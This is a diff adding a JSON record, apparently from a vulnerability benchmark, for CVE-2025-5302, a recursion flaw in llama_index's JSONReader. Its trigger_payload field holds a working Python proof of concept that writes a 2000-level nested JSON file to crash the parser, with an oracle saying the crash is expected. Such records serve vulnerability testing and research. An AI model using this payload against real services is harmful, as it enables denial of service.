@@ -1,0 +1,15 @@
+{
+  "file_id": "373_llama-index-core_huntr_70041b81-de9e-4046-8c0e-6ccd557048a6",
+  "numeric_id": "373",
+  "library_hint": "llama-index-core",
+  "source": "huntr",
+  "title": "Uncontrolled recursion in _depth_first_yield function leads to stack overflow and denial of service",
+  "cve": "CVE-2025-5302",
+  "cwe": "CWE-674: Uncontrolled Recursion",
+  "library": "llama_index",
+  "affected_version": "<= 0.12.37",
+  "vulnerable_function": "_depth_first_yield",
+  "triggerability": "indirect",
+  "trigger_payload": "import json\nimport sys\n\ndef create_malicious_json(filename, depth=2000):\n    \"\"\"Create a JSON file with a deeply nested dictionary, increasing recursion limit\"\"\"\n    original_limit = sys.getrecursionlimit()\n    sys.setrecursionlimit(depth + 100)\n    try:\n        nested_dict = {}\n        current = nested_dict\n        for i in range(depth):\n            current[\"key\" + str(i)] = {}\n            current = current[\"key\" + str(i)]\n        current[\"final\"] = \"end\"\n        with open(filename, \"w\", encoding=\"utf-8\") as f:\n            json.dump(nested_dict, f)\n        print(f\"Created malicious JSON file: {filename} with depth {depth}\")\n    except RecursionError:\n        print(\"RecursionError during JSON file creation. Try reducing depth or increasing recursion limit.\")\n        sys.exit(1)\n    except Exception as e:\n        print(f\"Error creating JSON file: {e}\")\n        sys.exit(1)\n    finally:\n        sys.setrecursionlimit(original_limit)\n\nif __name__ == \"__main__\":\n    malicious_file = \"malicious.json\"\n    create_malicious_json(malicious_file, depth=2000)\n\nfrom llama_index.core.readers.json import JSONReader\nreader = JSONReader(levels_back=1)\ndocuments = reader.load_data('malicious.json')\nprint(\"Loaded documents:\", documents)",
+  "oracle": "Python process crashes due to RecursionError"
+}
